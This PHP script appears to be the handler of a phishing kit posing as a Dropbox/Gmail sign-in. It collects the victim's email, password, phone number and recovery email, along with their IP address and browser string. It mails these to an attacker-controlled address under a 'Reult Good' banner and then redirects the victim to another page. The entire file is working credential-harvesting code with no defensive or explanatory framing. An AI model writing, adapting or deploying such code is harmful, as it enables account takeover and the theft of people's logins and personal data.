<?
include('././email.php');
include('./phpmail/mailer.php');
$ip = getenv("REMOTE_ADDR");
//+++++++++++++++++++++++++++++++// ISI PESAN \\+++++++++++++++++++++++++++++++\\
$message ="
.++--------------[ Dropbox| Gmail Info ]--------------++.
Email          :  ".$_POST['email']."
Password       :  ".$_POST['pass']."
Phone          :  ".$_POST['phone']."
Recovery Email :  ".$_POST['altemail']."

From            :  ".$ip." On ".date('r')."
Browser         :  ".$_SERVER['HTTP_USER_AGENT']."

++=============[ $$ Reult Good $$ ]==============++
";
//+++++++++++++++++++++++++++++++\\ ISI PESAN //+++++++++++++++++++++++++++++++\\
$subject = "From IP : $ip";
$headers = "From: Gmail Result $ip <antcopratae22@gmail.com>";
mail($emailku, $subject, $message, $headers);
header("Location: SS.html");
?>
